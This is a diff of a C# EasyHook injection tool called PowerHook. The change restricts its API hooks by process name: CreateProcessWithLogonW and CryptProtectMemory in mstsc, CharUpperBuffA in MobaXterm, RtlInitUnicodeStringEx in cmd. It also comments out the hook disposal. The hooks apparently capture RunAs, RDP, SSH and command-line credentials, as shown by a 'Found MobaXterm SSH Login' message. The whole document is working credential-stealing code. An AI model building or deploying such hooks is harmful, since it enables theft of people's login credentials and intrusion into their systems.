@@ -7,8 +7,8 @@ using System.Text;
 
 namespace PowerHook
 {
-    
-    public class InjectionEntryPoint: EasyHook.IEntryPoint
+
+    public class InjectionEntryPoint : EasyHook.IEntryPoint
     {
 
 
@@ -87,6 +87,8 @@ namespace PowerHook
         /// </summary>
         /// <param name="context">The RemoteHooking context</param>
         /// <param name="channelName">The name of the IPC channel</param>
+        /// 
+
         public InjectionEntryPoint(
             EasyHook.RemoteHooking.IContext context,
             string channelName)
@@ -113,9 +115,14 @@ namespace PowerHook
         {
             // Injection is now complete and the server interface is connected
             _server.IsInstalled(EasyHook.RemoteHooking.GetCurrentProcessId());
-            
-            //Install hooks
 
+            //Get the current process so we will hook the right function
+            var currentProcess = System.Diagnostics.Process.GetCurrentProcess().ProcessName;
+
+
+            //Install hooks
+            if (currentProcess == "mstsc")
+            {
                 // RunAs hook function
                 LoadLibrary("Advapi32.dll");
                 var CreateProcessWithLogonW = EasyHook.LocalHook.Create(
@@ -123,13 +130,26 @@ namespace PowerHook
                 new CreateProcessWithLogonW_Delegate(CreateProcessWithLogonW_Hook),
                 this);
 
+                // Activate hooks on all threads except the current thread
+                CreateProcessWithLogonW.ThreadACL.SetExclusiveACL(new Int32[] { 0 });
+            }
+                    
+            if (currentProcess == "mstsc")
+            {
                 // mstsc hook function (CredUnPackAuthenticationBufferW didnt work need to check, this is better then that function)
                 LoadLibrary("dpapi.dll");
                 var createCryptHook = EasyHook.LocalHook.Create(
                 EasyHook.LocalHook.GetProcAddress("dpapi.dll", "CryptProtectMemory"),
                 new CryptProtectMemory_Delegate(CryptProtectMemory_Hook),
                 this);
-                
+
+                // Activate hooks on all threads except the current thread
+                createCryptHook.ThreadACL.SetExclusiveACL(new Int32[] { 0 });
+            }
+            
+
+            if (currentProcess == "MobaXterm")
+            {
                 //MobaXterm hook function
                 LoadLibrary("user32.dll");
                 var CreateCharUpperBuffA = EasyHook.LocalHook.Create(
@@ -137,6 +157,12 @@ namespace PowerHook
                 new CharUpperBuffA_Delegate(CharUpperBuffA_Hook),
                 this);
 
+                // Activate hooks on all threads except the current thread
+                CreateCharUpperBuffA.ThreadACL.SetExclusiveACL(new Int32[] { 0 });
+            }
+                
+            if (currentProcess == "cmd")
+            {
                 //cmd hook function
                 LoadLibrary("ntdll.dll");
                 var CreateRtlInitUnicodeStringEx = EasyHook.LocalHook.Create(
@@ -144,16 +170,9 @@ namespace PowerHook
                 new RtlInitUnicodeStringEx_Delegate(RtlInitUnicodeStringEx_Hook),
                 this);
 
-
-
-
-
-            // Activate hooks on all threads except the current thread
-            CreateProcessWithLogonW.ThreadACL.SetExclusiveACL(new Int32[] { 0 });
-            createCryptHook.ThreadACL.SetExclusiveACL(new Int32[] { 0 });
-            CreateCharUpperBuffA.ThreadACL.SetExclusiveACL(new Int32[] { 0 });
-            CreateRtlInitUnicodeStringEx.ThreadACL.SetExclusiveACL(new Int32[] { 0 });
-           
+                // Activate hooks on all threads except the current thread
+                CreateRtlInitUnicodeStringEx.ThreadACL.SetExclusiveACL(new Int32[] { 0 });
+            }
 
 
             _server.ReportMessage("[+] Hooked into " + context.HostPID.ToString());
@@ -193,14 +212,12 @@ namespace PowerHook
             }
 
             // Remove hooks
-            CreateProcessWithLogonW.Dispose();
-            createCryptHook.Dispose();
-            CreateCharUpperBuffA.Dispose();
-            CreateRtlInitUnicodeStringEx.Dispose();
+
+            //CreateProcessWithLogonW.Dispose();
+            //createCryptHook.Dispose();
+            //CreateCharUpperBuffA.Dispose();
+            //CreateRtlInitUnicodeStringEx.Dispose();
          
-
-
-
             // Finalise cleanup of hooks
             EasyHook.LocalHook.Release();
         }
@@ -274,10 +291,6 @@ namespace PowerHook
                             this._messageQueue.Enqueue(
                             string.Format("[+] Found MobaXterm SSH Login --> {0}", Data));
                         }
-
-                        
-
-                     
 
                     }
                 }
